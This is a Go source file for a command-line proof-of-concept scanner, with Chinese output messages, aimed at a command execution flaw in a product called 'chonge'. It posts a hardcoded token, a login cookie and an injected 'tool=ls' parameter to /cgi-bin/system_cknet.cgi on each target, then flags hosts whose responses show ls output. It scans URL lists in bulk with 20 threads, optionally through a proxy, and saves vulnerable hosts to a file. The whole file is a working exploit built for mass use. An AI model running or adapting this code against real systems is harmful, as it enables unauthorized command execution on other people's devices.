package main

import (
	"bufio"
	"container/list"
	"fmt"
	"github.com/fatih/color"
	"github.com/urfave/cli"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

var (
	poc_name    string
	proxy       string
	threads     int
	output_file string
	print       printer
)

type printer struct {
	red    *color.Color
	yellow *color.Color
	blue   *color.Color
	green  *color.Color
}

func attack_from_url(target_url *string) string {
	path := "/cgi-bin/system_cknet.cgi"
	targetUrl := *target_url + path
	body := "token=7033cdee9c469742e7bb5d3c49d40a0a&addr=./&tool=ls&protocol=4"
	reader := strings.NewReader(body)
	request, err := http.NewRequest("POST", targetUrl, reader)
	if err != nil {
		panic(err)
	}
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	request.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0")
	request.Header.Set("Cookie", "login=578a5146965aacad4eb8f2b61cd6c5465654fccec93dc316b6fae1be3262bdc4; flag=")
	client := set_proxy()
	resp, err := client.Do(request)
	if err != nil {
		print.red.Println("[-] " + *target_url + " 访问错误")
	} else {
		bodys, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			panic(err)
		}
		body_data := string(bodys)
		if strings.Contains(body_data, "\"data\":\"ls:") {
			print.green.Println("[+] " + *target_url + " 存在chonge任意命令执行漏洞")
			return *target_url
		} else {
			print.yellow.Println("[-] " + *target_url + " 不存在chonge任意命令执行漏洞")
		}
		defer resp.Body.Close()
	}
	return ""
}

func attack_from_file(target_file *string) {
	success_url_list := list.New()
	target_url_lists := read_file(target_file)
	var data string
	string_chan := make(chan string)
	target_chan := make(chan string)
	if target_url_lists.Len() > 0 {
		print.blue.Println("[*] 成功读取目标，共计", target_url_lists.Len(), "个目标")
		for i := 0; i < threads; i++ {
			go attack_from_urls(target_chan, string_chan)
		}
		go func() {
			for i := target_url_lists.Front(); i != nil; i = i.Next() {
				target_url := fmt.Sprintf("%s", i.Value)
				target_chan <- target_url
			}
		}()
		for i := 0; i < target_url_lists.Len(); i++ {
			data = <-string_chan
			if data != "" {
				data = data + "\n"
				success_url_list.PushBack(data)
			}
		}
		close(string_chan)
		close(target_chan)
		write_file(success_url_list)
		print.blue.Println("[*] 共扫描个", target_url_lists.Len(), "目标，存在漏洞目标", success_url_list.Len(), "个。")
		print.blue.Println("[*] 扫描结果已保存到", output_file)
	} else {
		print.red.Println("[-] 未读取到目标，请检查文件中是否存在目标！")
	}
}

func attack_from_urls(target_chan, string_chan chan string) {
	for target_url := range target_chan {
		data := attack_from_url(&target_url)
		string_chan <- data
	}
}

func read_file(target_file *string) *list.List {
	file, err := os.Open(*target_file)
	if err != nil {
		panic(err)
	}
	target_url_lists := list.New()
	r := bufio.NewReader(file)
	for {
		line_bytes, err := r.ReadBytes('\n')
		line := strings.TrimSpace(string(line_bytes))
		if err != nil {
			if err == io.EOF {
				target_url_lists.PushBack(line)
				break
			}
			panic(err)
		}
		target_url_lists.PushBack(line)
	}
	return target_url_lists
}

func write_file(success_url_list *list.List) {
	file, err := OpenFile(output_file)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	write := bufio.NewWriter(file)
	for i := success_url_list.Front(); i != nil; i = i.Next() {
		data := fmt.Sprintf("%s", i.Value)
		_, err = write.WriteString(data)
		if err != nil {
			panic(err)
		}
	}
	defer write.Flush()
}

func set_proxy() *http.Client {
	if proxy != "" {
		proxyAddress, _ := url.Parse(proxy)
		client := &http.Client{
			Transport: &http.Transport{
				Proxy: http.ProxyURL(proxyAddress),
			},
			Timeout: 5 * time.Second,
		}
		return client
	} else {
		client := &http.Client{Timeout: 5 * time.Second}
		return client
	}
}

func OpenFile(filename string) (*os.File, error) {
	if _, err := os.Stat(filename); os.IsNotExist(err) {
		print.blue.Println("[+] 文件不存在，自动创建输出文件")
		return os.Create(filename) //创建文件
	}
	return os.OpenFile(filename, os.O_RDWR|os.O_TRUNC|os.O_CREATE, 0666) //打开文件
}

func set_screen_color() {
	print.red = color.New(color.FgRed, color.Bold)
	print.yellow = color.New(color.FgYellow, color.Bold)
	print.blue = color.New(color.FgBlue, color.Bold)
	print.green = color.New(color.FgGreen, color.Bold)
}

func print_head() {
	head := "    __  ____________  ____  ______\n   / / / / ____/ __ \\/ __ \\/ ____/\n  / /_/ / /   / /_/ / / / / /     \n / __  / /___/ ____/ /_/ / /___   \n/_/ /_/\\____/_/    \\____/\\____/   \n"
	print.blue.Println(head)
	print.blue.Println("		poc_name ", poc_name, "\n")
}

func main() {
	var target_url string
	var target_file string

	poc_name = "chonge命令执行漏洞"

	set_screen_color()
	print_head()

	app := cli.App{
		Name:  "go poc模版",
		Usage: "一款通用的go语言poc模版",
		Flags: []cli.Flag{
			cli.StringFlag{
				Name:        "target_url,u",
				Usage:       "读取单个目标的`url`",
				Destination: &target_url,
			},
			cli.StringFlag{
				Name:        "target_file,f",
				Usage:       "从`File`读取批量读取URL",
				Destination: &target_file,
			},
			cli.StringFlag{
				Name:        "output,o",
				Usage:       "扫描结果输出到`File`",
				Destination: &output_file,
				Value:       "success.txt",
			},
			cli.StringFlag{
				Name:        "proxy,p",
				Usage:       "代理的`url`地址",
				Destination: &proxy,
			},
			cli.IntFlag{
				Name:        "thread,t",
				Usage:       "批量扫描时的线程`数量`",
				Destination: &threads,
				Value:       20,
			},
		},
		Action: func(c *cli.Context) error {
			if target_url != "" && target_file != "" {
				print.red.Println("[-] 请选择到底是进行单个扫描还是进行批量扫描！")
				os.Exit(0)
			} else if target_url != "" {
				attack_from_url(&target_url)
			} else if target_file != "" {
				attack_from_file(&target_file)
			}
			return nil
		},
	}
	err := app.Run(os.Args)
	if err != nil {
		log.Fatal(err)
	}
}
